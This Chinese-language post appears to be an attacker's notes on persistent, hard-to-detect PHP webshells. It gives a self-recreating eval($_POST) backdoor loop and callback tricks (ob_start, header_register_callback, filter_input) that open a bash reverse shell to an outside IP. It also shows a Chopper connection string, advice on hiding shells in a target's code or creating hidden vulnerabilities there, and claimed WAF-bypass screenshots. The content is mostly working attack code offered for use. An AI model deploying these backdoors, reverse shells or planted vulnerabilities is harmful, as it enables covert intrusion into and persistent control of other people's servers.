---
> 一 . WebShell 驻留内存 , 轮询并自动创建

```
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    $file = 'c.php';
    $code = '<?php eval($_POST[c]);?>';
    while(true) {
        if(!file_exists($file)) {
            file_put_contents($file, $code);
        }
        usleep(50);
    }
?>
```

---
> 二 . 使用回调函数

####1. ob_start
```
# 自动触发
<?php function a($b){exec('/bin/bash -c "bash -i >& /dev/tcp/8.8.8.8/8888 0>&1"');}ob_start("a");?>
```
####2. header_register_callback
```
# 自动触发
<?php function a() {exec('/bin/bash -c "bash -i >& /dev/tcp/8.8.8.8/8888 0>&1"');}header_register_callback('a');?>
<?php function a() {$_GET[c]($_GET[d]);}header_register_callback('a');?>
```
####3. filter_input
```
# 需要 POST 一个 C 参数 , 就会触发反弹 shell
<?php function a($value){ exec('/bin/bash -c "bash -i >& /dev/tcp/8.8.8.8/8888 0>&1"');}filter_input(INPUT_POST, 'c', FILTER_CALLBACK, array('options' => 'a'));?>
# 直接菜刀连接 , 密码为 c
http://127.0.0.1/index.php?&c=assert&d=eval($_POST['c'])
<?php function a($c){$c($_GET['d']);}filter_input(INPUT_GET,'c', FILTER_CALLBACK,array('options'=>'a'));?>
```
#### 4. 类似的函数还有 :
>[filter_var()](http://php.net/manual/en/function.filter-var.php)- Filters a variable with a specified filter
> [filter_input_array()](http://php.net/manual/en/function.filter-input-array.php)- Gets external variables and optionally filters them
> [filter_var_array()](http://php.net/manual/en/function.filter-var-array.php)- Gets multiple variables and optionally filters them

#### 5. stream_wrapper_register
```
<?php
class A{
    function __construct(){
        phpinfo();
        // $_GET[c]($_GET[d]);
    }
}
stream_wrapper_register("st", "A");
$fp = fopen("st://","r");
?>
```
#### 6. 通过构造上述的webshell
其实发现了一些思路关于如何隐藏 WebShell
当我们已经得到一个已知的 webshell 以后
我认为最好的 webshell 就是将 webshell 隐藏在目标服务器的正常代码逻辑中
例如 :
```
1. 为某类添加魔术函数 (但是需要保证这个函数可以被我们触发)
2. 构造一个新的漏洞 , 别人比较难以发现 , 但是我们可以很容易就可以触发
3. 修改 php 配置文件 , 开启远程文件包含等比较危险的配置 (这样 webshell 并不需要保存在目标硬盘上 , 直接发送请求即可动态调用)
4. 挂上内存马
5. ... 待整理

```
---
发一波过狗截图 :


![image.png](http://upload-images.jianshu.io/upload_images/2355077-0826b36a4749ead0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image.png](http://upload-images.jianshu.io/upload_images/2355077-fa607d71cd9067bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
